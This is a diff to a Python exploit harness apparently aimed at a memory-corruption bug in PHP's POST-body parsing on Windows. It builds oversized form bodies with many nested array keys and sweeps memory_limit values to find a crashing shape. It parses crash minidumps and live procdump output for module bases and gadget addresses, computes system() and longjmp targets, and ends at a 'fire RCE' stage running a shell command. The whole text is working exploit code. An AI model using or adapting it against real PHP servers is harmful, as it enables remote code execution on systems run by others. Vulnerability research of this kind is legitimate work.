@@ -78,7 +78,8 @@ def build_body(pad, memshift=40000, k1=30, k2=30, xlen=79984):
     out = b'memshift=' + b'M' * memshift + b'&'
     for i in range(k1):
         out += b'a[' + b'X' * xlen + b'%016d' % i + b'][c]=v&'
-    out += b'pad=' + quote_from_bytes(pad, safe='').encode() + b'&'
+    if pad:
+        out += b'pad=' + quote_from_bytes(pad, safe='').encode() + b'&'
     out += b'pad=x&'
     for i in range(k1, k1 + k2):
         out += b'a[' + b'X' * xlen + b'%016d' % i + b'][c]=v&'
@@ -179,13 +180,13 @@ def find_pop_rcx_ret(path):
     return hits
 
 # ---------------------------------------------------------------- minidump ----
-def parse_minidump(path, marker=b'\x01\x00\xad\xde\x06\x01\x00\x00', marker_pad_off=1928):
+def parse_minidump(path, marker=b'\x01\x00\xad\xde\x00\x00\x00\x00\x06\x01\x00\x00', marker_pad_off=1928):
     f = open(path, 'rb')
     mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
     if mm[:4] != b'MDMP':
         raise ValueError('not a minidump')
-    nstreams = struct.unpack_from('<I', mm, 12)[0]
-    dirrva = struct.unpack_from('<I', mm, 16)[0]
+    nstreams = struct.unpack_from('<I', mm, 8)[0]
+    dirrva = struct.unpack_from('<I', mm, 12)[0]
     modules, exc, ranges = [], None, []
     for i in range(nstreams):
         st, ds, rva = struct.unpack_from('<III', mm, dirrva + i * 12)
@@ -309,10 +310,12 @@ def start_php(php_exe, host, port, docroot, ini, log):
                          stdout=lf, stderr=lf)
     return p
 
-def write_ini(php_dir, stage, mem_limit_mb):
-    ini = os.path.join(php_dir, f'php_p2s_{mem_limit_mb}M.ini')
+def write_ini(php_dir, stage, mem_limit):
+    val = f'{mem_limit}M' if isinstance(mem_limit, int) else str(mem_limit)
+    tag = val.replace(' ', '')
+    ini = os.path.join(php_dir, 'php_p2s_%s.ini' % tag)
     with open(ini, 'w') as f:
-        f.write(f'memory_limit={mem_limit_mb}M\npost_max_size=1G\ndisplay_errors=On\n'
+        f.write(f'memory_limit={val}\npost_max_size=1G\ndisplay_errors=On\n'
                 f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n')
     return ini
 
@@ -347,27 +350,22 @@ def scrub(o):
 # at 8M per run 40271273745), then memory_limit ladder (moves the OOM strike
 # point for 7.4/8.0 where 8M always hits the clean 81920B hash-grow).
 SHAPES = [
-    (40000, 30, 30, 2528, 79984, 8),    # canonical Linux chain-B
-    (40000, 30, 30, 2528, 79984, 10),
-    (40000, 30, 30, 2528, 79984, 12),
-    (40000, 30, 30, 2528, 79984, 14),
-    (40000, 30, 30, 2528, 79984, 16),
-    (40000, 30, 30, 2528, 79984, 20),
-    (40000, 30, 30, 2528, 79984, 24),
-    (40000, 30, 30, 2528, 79984, 32),
-    (60000, 30, 30, 2528, 79984, 16),
-    (30000, 30, 30, 2528, 79984, 16),
-    (40000, 30, 30, 2528, 79984, 48),
-    (40000, 62, 62, 2528, 79984, 16),
-    (40000, 30, 30, 2528, 79984, 64),
-    (80000, 30, 30, 2528, 79984, 24),
-    (120000, 30, 30, 2528, 79984, 32),
-    (40000, 14, 14, 2528, 79984, 16),
-    (40000, 46, 46, 2528, 79984, 24),
+    (40000, 30, 30, 2528, 79984, 8),    # P canonical — CI killer 8.x (0xC0000005 attempt=0)
+]
+# v4: byte-level P family — crossing band observed on 7.4/8.0 lies in (10M, 12M):
+# 10M -> clean in-band fatal, 12M -> P2S-OK. 64KB steps shift which alloc crosses.
+for _lim in range(10485760, 12582913, 65536):
+    SHAPES.append((40000, 30, 30, 2528, 79984, str(_lim)))
+SHAPES += [
+    (40000, 62, 62, 2528, 79984, 16),   # k62 receipt @16M
+    (40000, 30, 30, 0, 79984, 8),       # A no-pad — CI killer 7.4.33/8.0.30 (a1 shape)
+    (40000, 30, 30, 0, 79984, 10),
+    (40000, 30, 30, 0, 79984, 12),
 ]
 
 def shape_name(s):
-    return f'M{s[0]},k{s[1]}+{s[2]},pad{s[3]},x{s[4]},lim{s[5]}M'
+    lim = f'{s[5]}M' if isinstance(s[5], int) else f'{s[5]}B'
+    return f'M{s[0]},k{s[1]}+{s[2]},pad{s[3]},x{s[4]},lim{lim}'
 
 # ---------------------------------------------------------------- main ----
 def main():
@@ -403,7 +401,7 @@ def main():
     # ---- dump instruments ---------------------------------------------------
     wer_vals = wer_register('php.exe', a.dump_dir)
     print('P2S_WER php.exe reg=' + json.dumps(wer_vals))
-    wer_selftest(a.dump_dir, stage)
+    # v4: WER selftest removed — GH runners never emit LocalDumps (v3 receipt NODUMP x7); procdump is the instrument.
     pre_dumps = set(glob.glob(os.path.join(a.dump_dir, '*.dmp')))
     pd_proc = procdump_start(stage, a.dump_dir)
     crash_dirs = [a.dump_dir]
@@ -435,9 +433,10 @@ def main():
         body = build_body(build_probe_pad(sh[3]), memshift=sh[0], k1=sh[1], k2=sh[2], xlen=sh[4])
         pr = http_post(a.host, a.port, body, 'application/x-www-form-urlencoded')
         btxt = pr.get('body', b'')[:300].decode('latin-1', 'replace')
-        t0 = time.time()
-        while p_cur.poll() is None and time.time() - t0 < 25:
-            time.sleep(0.5)
+        if pr.get('status') is None:
+            t0 = time.time()
+            while p_cur.poll() is None and time.time() - t0 < 25:
+                time.sleep(0.5)
         rc = p_cur.poll()
         ent = {'attempt': si, 'shape': sh, 'resp': pr.get('status'), 'body_len': pr.get('body_len'),
                'php_exit': rc, 'err': pr.get('error'), 'resp_body': btxt[:300]}
@@ -477,6 +476,12 @@ def main():
 
     # ---- dump parse -> constants --------------------------------------------
     md = parse_minidump(dump)
+    if win_shape[3] == 0:
+        print('P2S_STAGE=KILLER_NO_PAD (a1-family crash; no RCE pad in body)')
+        res['exc'] = md['exc']
+        res['modules'] = md['modules']
+        save(res)
+        return 15
     if not md['pad_hits']:
         print('P2S_STAGE_MEASURE=FAIL (marker not found in dump)')
         res['exc'] = md['exc']
@@ -550,6 +555,46 @@ def main():
         return 11
     ctl2 = http_get(a.host, a.port)
     print(f'P2S_STAGE_FIRE control2 status={ctl2["status"]} body={ctl2["body"][:80]!r}')
+
+    # ---- v4: live dump of the fire target -> DLL bases from THIS process ----
+    try:
+        pre_live = set(glob.glob(os.path.join(a.dump_dir, '*.dmp')))
+        pd_exe = os.path.join(stage, 'procdump64.exe')
+        if os.path.exists(pd_exe):
+            subprocess.run([pd_exe, '-accepteula', '-ma', str(p2.pid)], cwd=a.dump_dir,
+                           capture_output=True, timeout=120)
+            t0 = time.time()
+            live = None
+            while time.time() - t0 < 60 and live is None:
+                for d in set(glob.glob(os.path.join(a.dump_dir, '*.dmp'))) - pre_live:
+                    try:
+                        if os.path.getsize(d) > 100000:
+                            live = d
+                            break
+                    except OSError:
+                        pass
+                time.sleep(2)
+            if live:
+                lmd = parse_minidump(live)
+                lphp = [m for m in lmd['modules'] if m['name'].lower().endswith(('php7.dll', 'php8.dll'))]
+                lucrt = [m for m in lmd['modules'] if m['name'].lower().endswith('ucrtbase.dll')]
+                if lphp and lucrt:
+                    consts['php_dll_base'] = lphp[0]['base']
+                    consts['ucrt_base'] = lucrt[0]['base']
+                    consts['poprcx_ret'] = consts['php_dll_base'] + consts['poprcx_rva']
+                    consts['system'] = consts['ucrt_base'] + consts['system_rva']
+                    consts['longjmp'] = consts['ucrt_base'] + consts['longjmp_rva']
+                    consts['live_dump'] = live
+                    res['consts'] = consts
+                    print('P2S_LIVE_DUMP bases refreshed: php_dll=%#x ucrt=%#x pad=%#x'
+                          % (consts['php_dll_base'], consts['ucrt_base'], consts['PAD']))
+                    save(res)
+                else:
+                    print('P2S_LIVE_DUMP=FAIL (php dll / ucrtbase not in live dump)')
+            else:
+                print('P2S_LIVE_DUMP=FAIL (no live dump appeared)')
+    except Exception as exc:
+        print(f'P2S_LIVE_DUMP=FAIL {exc}')
 
     # ---- fire RCE (winning shape + limit) ------------------------------------
     cmd = a.cmd or f'cmd /c whoami > "{a.marker}" 2>&1'
